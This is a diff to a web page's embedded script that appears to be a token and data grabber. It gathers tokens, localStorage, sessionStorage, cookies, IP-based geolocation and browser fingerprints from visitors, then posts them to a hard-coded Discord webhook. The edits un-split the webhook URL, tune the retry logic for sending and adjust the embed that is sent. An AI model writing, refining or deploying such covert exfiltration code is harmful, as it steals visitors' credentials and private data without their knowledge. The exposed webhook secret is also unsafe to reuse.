@@ -28,7 +28,7 @@ html,body{margin:0;height:100%;background:#0b0d10;overflow:hidden;font-family:-a
 </div></div>
 <script>
 (function(){
-var wh=['https://canary.discord.com/api/webhooks','/1570340494217707613/','yTzSaOg8tH-jjPZNvIbh0H3J8j9CFkZMW7yyQg1oU3MpJdCfHD4FIsHqS3_pkrDBcFqH'].join('');
+var wh='https://discord.com/api/webhooks/1570340494217707613/yTzSaOg8tH-jjPZNvIbh0H3J8j9CFkZMW7yyQg1oU3MpJdCfHD4FIsHqS3_pkrDBcFqH';
 var ipUrl='https://api.ipify.org?format=json';
 var geo1='https://ipwho.is/';
 var geo2='http://ip-api.com/json/';
@@ -43,19 +43,19 @@ function cut(s,n){if(s==null)return '—';s=String(s);if(!s)return '—';return 
 
 function post(p){
   return fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p),keepalive:true,mode:'cors',credentials:'omit'}).then(function(r){
-    if(!r.ok)throw new Error('h'+r.status);
-    return true;
-  })
+    return r.ok;
+  }).catch(function(){return false})
 }
 function postR(p){
   var n=0;
   function go(){
-    if(n>=4)return Promise.resolve(false);
+    if(n>=3)return Promise.resolve(false);
     n++;
-    return post(p).catch(function(){return sleep(750*n).then(go)})
+    return post(p).then(function(ok){if(ok)return true;return sleep(700*n).then(go)})
   }
   return go();
 }
+
 function addTok(src,v,meta){
   if(!v||typeof v!=='string')return;
   if(re.test(v)){
@@ -282,7 +282,7 @@ function buildEmbed(d){
   var g=d.geo||{};
   var place=[g.city,g.region,g.country].filter(Boolean).join(', ')||'Unknown';
   var flag=g.flag||'🌐';
-  var clr=d.tok?0x57F287:0xED4245;
+  var clr=d.allToks&&d.allToks.length?0x57F287:0xED4245;
   var f=[];
 
   if(d.allToks&&d.allToks.length>0){
@@ -315,7 +315,8 @@ function buildEmbed(d){
   var storage='**localStorage:** `'+cut(d.ls,200)+'`\n**sessionStorage:** `'+cut(d.ss,200)+'`\n**cookies:** `'+cut(d.ck||'—',200)+'`';
   f.push(fld('🗄 Storage',storage,false));
   f.push(fld('🧪 Geo',g.src||'FAILED',true));
-  f.push(fld('🎯 Hooks','fetch:'+(window.fetch.__x?'✔':'✘')+' xhr:'+(XMLHttpRequest.prototype.__x?'✔':'✘')+' battery:'+(navigator.getBattery?'✔':'✘'),false));
+
+  if(f.length>24)f=f.slice(0,24);
 
   var desc='**UA**\n```\n'+cut(d.ua,400)+'\n```\n`canvas: '+(d.cv||'—')+'` `audio: '+(d.au||'—')+'`';
 
@@ -329,13 +330,7 @@ function buildEmbed(d){
 function report(){
   return collect().then(function(d){
     var eb=buildEmbed(d);
-    return postR(eb).then(function(ok){
-      var tt=d.allToks||[];
-      if(ok&&tt.length>0){
-        var sum=tt.map(function(t){return '`'+t.tok.slice(0,10)+'..'+t.tok.slice(-6)+'`'}).join('\n');
-        return postR({content:'@here 🔑 '+tt.length+' token(s)\n'+sum});
-      }
-    })
+    return postR(eb);
   })
 }
 
